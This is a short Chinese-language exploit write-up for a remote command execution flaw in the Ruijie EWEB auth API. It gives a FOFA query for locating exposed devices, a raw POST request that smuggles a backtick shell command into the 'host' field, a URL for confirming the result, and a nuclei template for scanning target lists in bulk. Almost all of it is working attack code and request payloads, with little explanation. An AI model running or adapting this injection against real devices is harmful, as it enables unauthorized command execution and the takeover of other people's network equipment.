1、fofa语句

```yaml
body="cgi-bin/luci" && body="#f47f3e"
```

2、数据包

```yaml
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: XXXXXXXXXX.com
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"method":"checkNet","params":{"host":"`echo c149136B>666666.txt`"}}
```

3、访问

 http://XXXXXXXXXXXX:XXXX/cgi-bin/666666.txt



![img](%E9%94%90%E6%8D%B7%20EWEB%20auth%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.assets/a3a7e0f1a18950668f0e5c0dc1a17350.png)

4、nuclei POC

基本命令： nuclei.exe -l  网址文件.txt  -t  POC.yaml





```yaml
id: ruijie-EWEB-auth-RCE
info:
  name: auth接口存在RCE漏洞
  author: someone
  severity: critical
  description: auth接口存在RCE漏洞，恶意攻击者可能会利用该漏洞执行恶意命令，进而导致服务器失陷。
  reference:
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="cgi-bin/luci" && body="#f47f3e"
  tags: RCE
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /cgi-bin/luci/api/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

        {"method":"checkNet","params":{"host":"`echo {{666}}>{{filename}}.txt`"}}


      - |
        GET /cgi-bin/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0


    matchers:
      - type: dsl
        dsl:
          - "status_code_2==200 && contains_all(body,'{{666}}')"
```